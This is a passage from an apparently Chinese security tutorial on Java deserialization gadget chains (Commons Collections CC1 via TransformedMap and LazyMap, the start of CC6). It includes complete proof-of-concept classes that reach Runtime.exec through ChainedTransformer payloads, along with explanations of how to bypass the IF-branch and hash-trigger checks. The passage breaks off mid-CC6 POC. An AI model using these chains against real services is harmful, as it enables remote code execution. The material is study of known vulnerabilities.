java.io.IOException, ClassNotFoundException </span>&#123;<br>        s.defaultReadObject();<br><br>        <span class="hljs-comment">// Check to make sure that types have not evolved incompatibly</span><br><br>        AnnotationType annotationType = <span class="hljs-keyword">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            annotationType = AnnotationType.getInstance(type);<br>        &#125; <span class="hljs-keyword">catch</span>(IllegalArgumentException e) &#123;<br>            <span class="hljs-comment">// Class is no longer an annotation type; time to punch out</span><br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> java.io.InvalidObjectException(<span class="hljs-string">&quot;Non-annotation type in annotation serial stream&quot;</span>);<br>        &#125;<br><br>        Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();<br><br>        <span class="hljs-comment">// If there are annotation members without values, that</span><br>        <span class="hljs-comment">// situation is handled by the invoke method.</span><br>        <span class="hljs-keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;<br>            String name = memberValue.getKey();<br>            Class&lt;?&gt; memberType = memberTypes.get(name);<br>            <span class="hljs-keyword">if</span> (memberType != <span class="hljs-keyword">null</span>) &#123;  <span class="hljs-comment">// i.e. member still exists</span><br>                Object value = memberValue.getValue();<br>                <span class="hljs-keyword">if</span> (!(memberType.isInstance(value) ||<br>                      value <span class="hljs-keyword">instanceof</span> ExceptionProxy)) &#123;<br>                    memberValue.setValue(<br>                        <span class="hljs-keyword">new</span> AnnotationTypeMismatchExceptionProxy(<br>                            value.getClass() + <span class="hljs-string">&quot;[&quot;</span> + value + <span class="hljs-string">&quot;]&quot;</span>).setMember(<br>                                annotationType.members().get(name)));<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>两个IF分支的分析</strong></p><p>首先从我们传入的注解类中读取对应的成员方法/属性，然后检查我们传入的memberValues是否按照{成员方法/属性名：不可强转 &amp;&amp; 非ExceptionProxy类}的格式来进行设置。</p><p>因此我们将基础的Map改为如下，从而成功绕过IF分支检查。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">map.put(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-string">&quot;aaa&quot;</span>);<br></code></pre></td></tr></table></figure><p><strong>setValue对象控制</strong></p><p>我们transform操作的对象是Runtime.class，但是由于在readObject中存在的并不是可控的。</p><p>在Transformer中存在一个ConstantTransformer，它的transform方法就是返回一个设定的固定值，那么我们只需要在ChainedTransformer的构造数组中添加一个ConstantTransformer，我们就不需要额外的调用传参了。</p><h2 id="poc与调用链">3、POC与调用链</h2><p>调用链</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>readObject<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TransformedMap</span>.</span></span>entry<span class="hljs-constructor">Set(遍历)</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">MapEntry</span>.</span></span>setValue<br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ChainedTransformer</span>.</span></span>trasnform<br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ConstantTransformer</span>.</span></span>transform<br>                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<br></code></pre></td></tr></table></figure><p>POC</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo03</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String fileName = <span class="hljs-string">&quot;ser.bin&quot;</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchFieldException </span>&#123;<br>        <span class="hljs-comment">// Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="hljs-comment">//        InvokerTransformer inv = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;);</span><br>        <span class="hljs-comment">// inv.transform(Runtime.getRuntime());</span><br><br>        Transformer[] transformer = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformer);<br><span class="hljs-comment">//        chainedTransformer.transform(Runtime.class);</span><br><br>        HashMap&lt;Object,Object&gt; map = <span class="hljs-keyword">new</span> HashMap&lt;Object,Object&gt;();<br>        map.put(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-string">&quot;aaa&quot;</span>);<br>        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, <span class="hljs-keyword">null</span>, chainedTransformer);<br><br><br>        Class&lt;?&gt; c = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; declaredConstructor = c.getDeclaredConstructor(Class.class, Map.class);<br>        declaredConstructor.setAccessible(<span class="hljs-keyword">true</span>);<br>        Object annotationInvocationHandler = declaredConstructor.newInstance(Target.class, transformedMap);<br>        serialize(annotationInvocationHandler);<br>        unserialize();<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">unserialize</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException </span>&#123;<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-keyword">new</span> File(fileName)));<br>        Object obj = ois.readObject();<br>        System.out.println(<span class="hljs-string">&quot;反序列化成功！！！&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">serialize</span><span class="hljs-params">(Object object)</span> <span class="hljs-keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException </span>&#123;<br>        ObjectOutputStream outputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(<span class="hljs-keyword">new</span> FileOutputStream(fileName));<br>        outputStream.writeObject(object);<br>        System.out.println(<span class="hljs-string">&quot;序列化成功！！！&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="修复">4、修复</h2><p>在高版本中的JDK，对于AnnotationInvocationHandler的readObject方法进行了修改，取消了setValue的直接调用，这条链子因此也不能再被利用。</p><h1 id="cc1链---lazymap">CC1链 - LazyMap</h1><p>除了使用TransformedMap这条链子，CC1链往往还可以使用Lazymap这条链子，以下我们来分析LazyMap这条链子。</p><p>回顾一下我们寻找Transform方法调用的经过，当时除了TransformedMap，还存在一个LazyMap。</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>readObject<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TransformedMap</span>.</span></span>entry<span class="hljs-constructor">Set(遍历)</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">MapEntry</span>.</span></span>setValue<br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ChainedTransformer</span>.</span></span>trasnform<br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ConstantTransformer</span>.</span></span>transform<br>                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<br></code></pre></td></tr></table></figure><h2 id="transform的调用点">1、transform的调用点</h2><p>这一条链子我们从LazyMap出发来进行分析。</p><p>LazyMap的get方法中自身的<code>factory</code>对transform进行了调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">get</span><span class="hljs-params">(Object key)</span> </span>&#123;<br>    <span class="hljs-comment">// create value for key if key is not currently in the map</span><br>    <span class="hljs-keyword">if</span> (map.containsKey(key) == <span class="hljs-keyword">false</span>) &#123;<br>        Object value = factory.transform(key);<br>        map.put(key, value);<br>        <span class="hljs-keyword">return</span> value;<br>    &#125;<br>    <span class="hljs-keyword">return</span> map.get(key);<br>&#125;<br></code></pre></td></tr></table></figure><p>同样的LazyMap的构造函数只能通过<code>decorate</code>间接调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Map <span class="hljs-title">decorate</span><span class="hljs-params">(Map map, Transformer factory)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> LazyMap(map, factory);<br>    &#125;<br></code></pre></td></tr></table></figure><p>对于get方法的调用是非常多的，在TransformedMap那条链中也存在的<code>AnnotationInvocationHandler</code>类也存在相对应的方法<code>invoke</code>，我们可以考虑从这条链出发。</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">（Proxy）<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>invoke<br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LazyMap</span>.</span></span>get<br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ChainedTransformer</span>.</span></span>trasnform<br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ConstantTransformer</span>.</span></span>transform<br>                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<br></code></pre></td></tr></table></figure><h2 id="readobject入口点-1">2、readObject入口点</h2><p>我们如何在readObject的位置触发AnnotationInvocationHandler的invoke函数呢，我们学习一下invoke函数的具体用途。<code>invoke(Object proxy, Method method, Object[] args)</code>：拦截代理对象上的方法调用，并处理注解相关的方法。</p><p>现在来看对应的invoke实现，关键在于要调用一个无参函数。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> </span>&#123;<br>    String member = method.getName();<br>    Class&lt;?&gt;[] paramTypes = method.getParameterTypes();<br><br>    <span class="hljs-comment">// Handle Object and Annotation methods</span><br>    <span class="hljs-keyword">if</span> (member.equals(<span class="hljs-string">&quot;equals&quot;</span>) &amp;&amp; paramTypes.length == <span class="hljs-number">1</span> &amp;&amp;<br>        paramTypes[<span class="hljs-number">0</span>] == Object.class)<br>        <span class="hljs-keyword">return</span> equalsImpl(args[<span class="hljs-number">0</span>]);<br>    <span class="hljs-keyword">if</span> (paramTypes.length != <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> AssertionError(<span class="hljs-string">&quot;Too many parameters for an annotation method&quot;</span>);<br><br>    <span class="hljs-keyword">switch</span>(member) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;toString&quot;</span>:<br>        <span class="hljs-keyword">return</span> toStringImpl();<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;hashCode&quot;</span>:<br>        <span class="hljs-keyword">return</span> hashCodeImpl();<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;annotationType&quot;</span>:<br>        <span class="hljs-keyword">return</span> type;<br>    &#125;<br><br>    <span class="hljs-comment">// Handle annotation member accessors</span><br>    <span class="hljs-comment">// 这里触发反序列化链条</span><br>    Object result = memberValues.get(member);<br><br>    <span class="hljs-keyword">if</span> (result == <span class="hljs-keyword">null</span>)<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> IncompleteAnnotationException(type, member);<br><br>    <span class="hljs-keyword">if</span> (result <span class="hljs-keyword">instanceof</span> ExceptionProxy)<br>        <span class="hljs-keyword">throw</span> ((ExceptionProxy) result).generateException();<br><br>    <span class="hljs-keyword">if</span> (result.getClass().isArray() &amp;&amp; Array.getLength(result) != <span class="hljs-number">0</span>)<br>        result = cloneArray(result);<br><br>    <span class="hljs-keyword">return</span> result;<br>    &#125;<br></code></pre></td></tr></table></figure><p>接下来只要找一个类在readObject中调用成员的无参函数，将他的成员赋值为LazyMap的动态代理，然后触发反序列化链了。</p><p>yoserial作者的炫技之处就在于，<code>AnnotationInvocationHandler</code>的readObject就存在一个对于无参函数的调用，于是就可以成功触发invoke</p><h2 id="poc与调用链-1">3、Poc与调用链</h2><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>invoke<br>（Proxy）<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>invoke<br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LazyMap</span>.</span></span>get<br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ChainedTransformer</span>.</span></span>trasnform<br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ConstantTransformer</span>.</span></span>transform<br>                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<br></code></pre></td></tr></table></figure><p>Poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.ms08067;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC1TestLazyMap</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String fileName = <span class="hljs-string">&quot;ser.bin&quot;</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchFieldException </span>&#123;<br>        <span class="hljs-comment">// Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="hljs-comment">//        InvokerTransformer inv = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;);</span><br>        <span class="hljs-comment">// inv.transform(Runtime.getRuntime());</span><br><br>        Transformer[] transformer = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformer);<br><span class="hljs-comment">//        chainedTransformer.transform(Runtime.class);</span><br><br><br>        HashMap&lt;Object,Object&gt; map = <span class="hljs-keyword">new</span> HashMap&lt;Object,Object&gt;();<br>        map.put(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-string">&quot;aaa&quot;</span>);<br>        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, chainedTransformer);<br><br>        Class&lt;?&gt; c = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; declaredConstructor = c.getDeclaredConstructor(Class.class, Map.class);<br>        declaredConstructor.setAccessible(<span class="hljs-keyword">true</span>);<br>        <span class="hljs-comment">// 强转是因为要做代理</span><br>        InvocationHandler invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Target.class, lazyMap);<br><br>        Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),<br>                                                    LazyMap.class.getInterfaces(),<br>                                                    invocationHandler);<br><br>        Class&lt;?&gt; c1 = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; declaredConstructor1= c.getDeclaredConstructor(Class.class, Map.class);<br>        declaredConstructor.setAccessible(<span class="hljs-keyword">true</span>);<br>        Object annotationInvocationHandler = declaredConstructor.newInstance(Target.class, mapProxy);<br>        serialize(annotationInvocationHandler);<br>        unserialize();<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">unserialize</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException </span>&#123;<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-keyword">new</span> File(fileName)));<br>        Object obj = ois.readObject();<br>        System.out.println(<span class="hljs-string">&quot;反序列化成功！！！&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">serialize</span><span class="hljs-params">(Object object)</span> <span class="hljs-keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException </span>&#123;<br>        ObjectOutputStream outputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(<span class="hljs-keyword">new</span> FileOutputStream(fileName));<br>        outputStream.writeObject(object);<br>        System.out.println(<span class="hljs-string">&quot;序列化成功！！！&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="cc6链">CC6链</h1><p>我们在CC1链中，找到了一个有非常多引用的LazyMap的get方法，当时我们在动态代理的AnnotationInvocationHandler中选取了invoke方法进行调用，但是回过头来看，当时可以使用的方法非常多，是否存在其他的利用可能性。</p><p>更为关键的是，在后续的JDK版本中，CC1链上需要的利用点已经被修复了，这也就导致了CC1链的可使用范围受限，由此我们有需求找寻更为通用的CC链。</p><p>我们重新回到LazyMap.get</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LazyMap</span>.</span></span>get<br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ChainedTransformer</span>.</span></span>trasnform<br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ConstantTransformer</span>.</span></span>transform<br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<br></code></pre></td></tr></table></figure><h2 id="get调用点">1、get调用点</h2><p>根据CC6的作者，他找寻的下一个点是TiedMapEntry</p><p>其中TiedMapEntry的hashCode方法调用了getValue，而在getValue的实现中进行了get方法调用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">hashCode</span><span class="hljs-params">()</span> </span>&#123;<br>    Object value = getValue();<br>    <span class="hljs-keyword">return</span> (getKey() == <span class="hljs-keyword">null</span> ? <span class="hljs-number">0</span> : getKey().hashCode()) ^<br>           (value == <span class="hljs-keyword">null</span> ? <span class="hljs-number">0</span> : value.hashCode()); <br>&#125;<br></code></pre></td></tr></table></figure><p>如何触发TiedMapEntry调用hashCode呢，这个我们在URLDNS这条链中已经进行过分析。</p><p>HashMap在readObject的过程中会对key值进行hash操作，从而调用HashCode.</p><h2 id="序列化hash绕过">2、序列化Hash绕过</h2><p>在具体的Poc编写中，我们需要注意HashMap的Put方法也会调用hashCode，因此我们需要利用反射修改其中的值来避免在序列化的时候触发链条。</p><p>这里我们可以看看LazyMap的get方法中如何触发transform</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">get</span><span class="hljs-params">(Object key)</span> </span>&#123;<br>    <span class="hljs-comment">// create value for key if key is not currently in the map</span><br>    <span class="hljs-keyword">if</span> (map.containsKey(key) == <span class="hljs-keyword">false</span>) &#123;<br>        Object value = factory.transform(key);<br>        map.put(key, value);<br>        <span class="hljs-keyword">return</span> value;<br>    &#125;<br>    <span class="hljs-keyword">return</span> map.get(key);<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到当key不存在的时候，才会触发transform。</p><p>由此，我们可以在put前选择存在的key，在put后修改对应的key值。</p><h2 id="poc与调用链-2">3、Poc与调用链</h2><p>调用链</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>readObject<br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TiedMapEntry</span>.</span></span>hashCode<br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LazyMap</span>.</span></span>get<br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ChainedTransformer</span>.</span></span>trasnform<br>                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ConstantTransformer</span>.</span></span>transform<br>                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<br></code></pre></td></tr></table></figure><p>POC</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 